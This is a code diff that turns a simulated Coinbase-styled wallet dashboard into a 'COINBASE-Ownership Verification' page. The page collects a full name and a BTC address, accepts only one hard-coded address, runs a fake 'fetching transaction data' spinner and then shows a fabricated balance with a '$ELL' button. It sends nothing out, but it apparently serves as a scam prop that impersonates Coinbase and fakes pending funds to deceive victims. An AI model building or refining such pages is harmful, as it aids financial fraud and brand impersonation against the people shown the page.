@@ -2,195 +2,286 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Coinbase-$-Extension</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <!-- Tailwind CDN for styling -->
-  <script src="https://cdn.tailwindcss.com"></script>
+  <title>COINBASE-Ownership Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    html { font-size: 14px; }
-    body { background: #111827; }
-    /* Hide scrollbar for Chrome, Safari and Opera */
-    ::-webkit-scrollbar { display: none; }
-    /* Hide scrollbar for IE, Edge and Firefox */
-    html { -ms-overflow-style: none; scrollbar-width: none; }
+    body { 
+      margin: 0; 
+      padding: 0; 
+      font-family: 'Segoe UI', Arial, sans-serif; 
+      background: #f4f6fa; 
+      min-height: 100vh; 
+      display: flex; 
+      flex-direction: column; 
+      align-items: center; 
+      justify-content: center;
+    }
+    .image-container {
+      margin-top: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .image-container img {
+      max-width: 330px;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px 0 rgba(44,62,80,0.1);
+    }
+    .floating-btn {
+      position: fixed;
+      bottom: 40px;
+      right: 40px;
+      background: #0052ff;
+      color: #fff;
+      border: none;
+      border-radius: 32px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.13);
+      padding: 18px 34px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      z-index: 10;
+      transition: background 0.22s;
+    }
+    .floating-btn:hover {
+      background: #0037b3;
+    }
+    .modal, .dashboard, .loading-section {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(30,38,50,0.52);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+      transition: opacity 0.25s;
+    }
+    .modal-content, .dashboard-content, .loading-content {
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 6px 32px 0 rgba(44,62,80,0.13);
+      padding: 34px 28px 30px;
+      width: 95vw;
+      max-width: 380px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    .country-flag {
+      font-size: 2.2rem;
+      margin-bottom: 12px;
+    }
+    .form-field {
+      margin: 1.2em 0;
+      text-align: left;
+    }
+    .form-label {
+      font-weight: 500;
+      margin-bottom: 4px;
+      display: block;
+    }
+    .form-input {
+      width: 100%;
+      padding: 10px 11px;
+      font-size: 1rem;
+      border-radius: 7px;
+      border: 1px solid #d2d6df;
+      margin-bottom: 3px;
+      box-sizing: border-box;
+      outline: none;
+      transition: border 0.18s;
+    }
+    .form-input:focus {
+      border: 1.5px solid #0052ff;
+    }
+    .pending-btn {
+      margin-top: 10px;
+      width: 100%;
+      background: #0052ff;
+      color: #fff;
+      font-size: 1rem;
+      border: none;
+      border-radius: 7px;
+      padding: 13px 0;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.19s;
+    }
+    .pending-btn:hover {
+      background: #0037b3;
+    }
+    .error-message {
+      color: #e74c3c;
+      margin-bottom: 10px;
+      font-size: 0.96em;
+    }
+    /* Loading Spinner Styles */
+    .loading-spinner {
+      margin: 0 auto 20px;
+      position: relative;
+      width: 64px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .coinbase-logo {
+      width: 40px; height: 40px;
+      background: #fff;
+      border-radius: 50%;
+      border: 4px solid #0052ff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      left: 12px;
+      top: 12px;
+    }
+    .coinbase-logo svg {
+      width: 24px;
+      height: 24px;
+    }
+    .spinner-ring {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      width: 100%; height: 100%;
+      border: 5px solid #c4dafc;
+      border-top: 5px solid #0052ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      z-index: 2;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg);}
+    }
+    .loading-caption {
+      font-size: 1.12em;
+      color: #212c38;
+      margin-top: 18px;
+      font-weight: 500;
+      letter-spacing: 1px;
+    }
+    /* Dashboard Styles */
+    .dashboard-balance {
+      font-size: 2.1rem;
+      color: #0052ff;
+      font-weight: 700;
+      margin-bottom: 16px;
+      margin-top: 18px;
+    }
+    .dashboard-btn {
+      margin-top: 16px;
+      width: 100%;
+      background: #22b573;
+      color: #fff;
+      font-size: 1.09rem;
+      border: none;
+      border-radius: 8px;
+      padding: 15px 0;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.18s;
+    }
+    .dashboard-btn:hover {
+      background: #188a53;
+    }
+    @media (max-width: 599px) {
+      .floating-btn { bottom: 22px; right: 14px; padding: 13px 20px; font-size: 1rem;}
+      .modal-content, .dashboard-content, .loading-content { max-width: 97vw; padding: 18px 5vw 18px;}
+    }
   </style>
 </head>
-<body class="bg-gray-900 text-gray-100 font-sans text-sm min-h-screen">
+<body>
+  <div class="image-container">
+    <!-- Replace src with your uploaded image file (e.g., image1.jpg) -->
+    <img id="main-image" src="YOUR_IMAGE_HERE.jpg" alt="Ownership Verification" />
+  </div>
 
-  <!-- Header -->
-  <header class="w-full bg-gray-800 flex items-center justify-between px-6 py-4 shadow-sm">
-    <h1 class="text-xl font-bold tracking-tight text-white">Coinbase Wallet</h1>
-    <div class="flex items-center space-x-4">
-      <button class="bg-indigo-600 hover:bg-indigo-500 text-xs rounded px-4 py-2 font-medium transition">Sign Out</button>
+  <button class="floating-btn" id="dashboardBtn">Go to Dashboard</button>
+
+  <!-- Modal for Country, Name & BTC Address -->
+  <div class="modal" id="modal" style="display: none;">
+    <div class="modal-content">
+      <div class="country-flag">🇺🇸</div>
+      <div style="font-weight:600;font-size:1.18em;margin-bottom:11px;">Confirm your country</div>
+      <div style="color: #767676; font-size: 1em; margin-bottom:17px;">United States</div>
+      <form id="ownershipForm" autocomplete="off">
+        <div class="form-field">
+          <label class="form-label" for="fullName">Full Name</label>
+          <input class="form-input" id="fullName" name="fullName" type="text" required placeholder="Enter your full name" />
+        </div>
+        <div class="form-field">
+          <label class="form-label" for="btcAddress">BTC Address</label>
+          <input class="form-input" id="btcAddress" name="btcAddress" type="text" required placeholder="Enter your BTC Address" />
+        </div>
+        <div id="errorMsg" class="error-message" style="display: none;"></div>
+        <button type="submit" class="pending-btn">Retrieve Pending Transaction</button>
+      </form>
     </div>
-  </header>
+  </div>
 
-  <!-- Main Layout -->
-  <div class="flex flex-row min-h-[90vh]">
-    <!-- Sidebar -->
-    <aside class="hidden md:flex flex-col w-56 bg-gray-800 p-4 space-y-2 border-r border-gray-700">
-      <button class="flex items-center px-3 py-2 rounded-md text-gray-200 hover:bg-gray-700 transition text-sm font-medium"><span class="mr-3 text-lg">🏠</span>Dashboard</button>
-      <button class="flex items-center px-3 py-2 rounded-md text-gray-200 hover:bg-gray-700 transition text-sm font-medium"><span class="mr-3 text-lg">👛</span>Wallet</button>
-      <button class="flex items-center px-3 py-2 rounded-md text-gray-200 hover:bg-gray-700 transition text-sm font-medium"><span class="mr-3 text-lg">📤</span>Send</button>
-      <button class="flex items-center px-3 py-2 rounded-md text-gray-200 hover:bg-gray-700 transition text-sm font-medium"><span class="mr-3 text-lg">📥</span>Receive</button>
-      <button class="flex items-center px-3 py-2 rounded-md text-gray-200 hover:bg-gray-700 transition text-sm font-medium"><span class="mr-3 text-lg">💸</span>Transactions</button>
-    </aside>
-
-    <!-- Main Content -->
-    <main class="flex-1 p-4 sm:p-6">
-      <section class="mx-auto max-w-5xl">
-
-        <!-- Wallet Card -->
-        <div class="flex flex-col md:flex-row gap-6 mb-6">
-          <div class="flex-1 bg-gradient-to-br from-indigo-800 to-indigo-600 rounded-xl shadow-lg p-6 flex flex-col justify-between min-w-[270px]">
-            <div>
-              <div class="flex items-center mb-4">
-                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="ETH" class="h-7 w-7 mr-3" />
-                <span class="text-lg font-semibold">ETH Wallet</span>
-              </div>
-              <div class="text-2xl font-bold text-white" id="wallet-balance-usd">$2,450.34</div>
-              <div class="text-xs text-gray-200" id="wallet-balance-eth">0.9876 ETH</div>
-            </div>
-            <div class="flex space-x-2 mt-6">
-              <button id="send-btn" class="px-4 py-2 rounded text-xs font-semibold transition bg-indigo-500 text-white hover:bg-indigo-400">Send</button>
-              <button id="receive-btn" class="px-4 py-2 rounded text-xs font-semibold transition bg-gray-700 text-white hover:bg-gray-600">Receive</button>
-            </div>
-          </div>
+  <!-- Loading Section -->
+  <div class="loading-section" id="loadingSection" style="display:none;">
+    <div class="loading-content">
+      <div class="loading-spinner">
+        <div class="spinner-ring"></div>
+        <div class="coinbase-logo">
+          <!-- Coinbase Logo SVG -->
+          <svg viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="12" fill="#0052ff"/>
+            <rect x="7" y="11" width="10" height="2" rx="1" fill="#fff"/>
+          </svg>
         </div>
+      </div>
+      <div class="loading-caption">FETCHING TRANSACTION DATA</div>
+    </div>
+  </div>
 
-        <!-- Transactions -->
-        <div class="bg-gray-800 rounded-lg p-4">
-          <h2 class="text-base font-semibold mb-3 text-white">Recent Transactions</h2>
-          <table class="w-full text-xs">
-            <thead>
-              <tr class="text-left text-gray-300">
-                <th>Date</th>
-                <th>Type</th>
-                <th>Amount</th>
-                <th>Status</th>
-              </tr>
-            </thead>
-            <tbody class="divide-y divide-gray-700" id="tx-table-body">
-              <tr class="hover:bg-gray-700/30">
-                <td>2025-07-25</td>
-                <td>Send</td>
-                <td class="text-red-400">-0.02 ETH</td>
-                <td>Completed</td>
-              </tr>
-              <tr class="hover:bg-gray-700/30">
-                <td>2025-07-24</td>
-                <td>Receive</td>
-                <td class="text-green-400">+0.15 ETH</td>
-                <td>Completed</td>
-              </tr>
-              <tr class="hover:bg-gray-700/30">
-                <td>2025-07-22</td>
-                <td>Send</td>
-                <td class="text-red-400">-0.05 ETH</td>
-                <td>Pending</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <!-- Modal (hidden by default) -->
-        <div id="modal-bg" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
-          <div class="bg-gray-900 rounded-lg p-6 w-full max-w-sm shadow-lg">
-            <h3 id="modal-title" class="text-base font-bold mb-4"></h3>
-            <div id="modal-send" class="hidden">
-              <div class="mb-3">
-                <label class="block text-xs text-gray-300 mb-1">Recipient Address</label>
-                <input id="input-address" type="text" class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded text-xs text-gray-100 focus:outline-none focus:border-indigo-500 transition" placeholder="Enter wallet address">
-              </div>
-              <div class="mb-3">
-                <label class="block text-xs text-gray-300 mb-1">Amount</label>
-                <input id="input-amount" type="number" class="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded text-xs text-gray-100 focus:outline-none focus:border-indigo-500 transition" placeholder="0.00">
-              </div>
-            </div>
-            <div id="modal-receive" class="hidden flex flex-col items-center">
-              <div class="bg-gray-800 p-4 rounded mb-2 w-full">
-                <span class="text-xs text-gray-300">Your Address</span>
-                <div class="font-mono text-xs mt-1 select-all break-all" id="wallet-address">0x1234abcd5678efgh9012ijklmn3456opqrst7890</div>
-              </div>
-              <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x1234abcd5678efgh9012ijklmn3456opqrst7890&size=112x112" alt="QR Code" class="w-28 h-28" />
-            </div>
-            <div class="flex justify-end gap-2 mt-4">
-              <button id="close-btn" class="px-4 py-2 rounded text-xs font-semibold transition bg-gray-700 text-white hover:bg-gray-600">Close</button>
-              <button id="modal-action-btn" class="px-4 py-2 rounded text-xs font-semibold transition bg-indigo-500 text-white hover:bg-indigo-400 hidden">Send</button>
-            </div>
-          </div>
-        </div>
-        <!-- Modal End -->
-
-      </section>
-    </main>
+  <!-- Dashboard Section -->
+  <div class="dashboard" id="dashboard" style="display:none;">
+    <div class="dashboard-content">
+      <div style="font-size:1.25em;font-weight:600;margin-bottom:10px;">Dashboard</div>
+      <div class="dashboard-balance">$25,6042.90</div>
+      <button class="dashboard-btn" id="sellBtn">$ELL</button>
+    </div>
   </div>
 
   <script>
-    // Modal logic
-    const modalBg = document.getElementById('modal-bg');
-    const sendBtn = document.getElementById('send-btn');
-    const receiveBtn = document.getElementById('receive-btn');
-    const closeBtn = document.getElementById('close-btn');
-    const modalTitle = document.getElementById('modal-title');
-    const modalSend = document.getElementById('modal-send');
-    const modalReceive = document.getElementById('modal-receive');
-    const modalActionBtn = document.getElementById('modal-action-btn');
-    const inputAddress = document.getElementById('input-address');
-    const inputAmount = document.getElementById('input-amount');
-    const txTableBody = document.getElementById('tx-table-body');
-
-    function openModal(type) {
-      modalBg.classList.remove('hidden');
-      if (type === 'send') {
-        modalTitle.textContent = 'Send Crypto';
-        modalSend.classList.remove('hidden');
-        modalReceive.classList.add('hidden');
-        modalActionBtn.classList.remove('hidden');
-        modalActionBtn.textContent = "Send";
-      } else if (type === 'receive') {
-        modalTitle.textContent = 'Receive Crypto';
-        modalSend.classList.add('hidden');
-        modalReceive.classList.remove('hidden');
-        modalActionBtn.classList.add('hidden');
-      }
-    }
-    function closeModal() {
-      modalBg.classList.add('hidden');
-      inputAddress.value = '';
-      inputAmount.value = '';
-    }
-    sendBtn.onclick = () => openModal('send');
-    receiveBtn.onclick = () => openModal('receive');
-    closeBtn.onclick = closeModal;
-
-    modalActionBtn.onclick = function() {
-      // Example "send" logic
-      const address = inputAddress.value.trim();
-      const amount = inputAmount.value.trim();
-      if (!address || !amount || isNaN(amount)) {
-        alert('Please enter a valid address and amount.');
-        return;
-      }
-      // Add to transaction table (simulate)
-      const newRow = document.createElement('tr');
-      newRow.className = "hover:bg-gray-700/30";
-      newRow.innerHTML = `<td>${(new Date()).toISOString().split('T')[0]}</td>
-        <td>Send</td>
-        <td class="text-red-400">-${parseFloat(amount).toFixed(2)} ETH</td>
-        <td>Pending</td>`;
-      txTableBody.insertBefore(newRow, txTableBody.firstChild);
-      closeModal();
-      alert('Transaction sent (simulation).');
+    // Show Modal on Dashboard Button Click
+    document.getElementById('dashboardBtn').onclick = function() {
+      document.getElementById('modal').style.display = 'flex';
     };
 
-    // Dismiss modal with Esc
-    document.addEventListener('keydown', function(e) {
-      if (!modalBg.classList.contains('hidden') && e.key === "Escape") closeModal();
-    });
+    // Ownership Form Handling
+    document.getElementById('ownershipForm').onsubmit = function(e) {
+      e.preventDefault();
+      var name = document.getElementById('fullName').value.trim();
+      var btc = document.getElementById('btcAddress').value.trim();
+      var errorMsg = document.getElementById('errorMsg');
+      if (!name || !btc) {
+        errorMsg.textContent = "Please fill in all fields.";
+        errorMsg.style.display = "block";
+        return false;
+      }
+      if (btc !== "3ChUNE...6rPUxd") {
+        errorMsg.textContent = "BTC address does not match the supported address for verification.";
+        errorMsg.style.display = "block";
+        return false;
+      }
+      errorMsg.style.display = "none";
+      document.getElementById('modal').style.display = 'none';
+      document.getElementById('loadingSection').style.display = 'flex';
+      // Loading animation (4 seconds)
+      setTimeout(function() {
+        document.getElementById('loadingSection').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'flex';
+      }, 4000);
+      return false;
+    };
 
-    // Responsive sidebar toggle for mobile (add if needed)
-    // You can add a hamburger icon and JS to show/hide the sidebar on mobile if you wish.
+    // Optional: Hide Modal if clicked outside the content
+    document.getElementById('modal').addEventListener('click', function(e) {
+      if (e.target === this) this.style.display = 'none';
+    });
   </script>
 </body>
 </html>
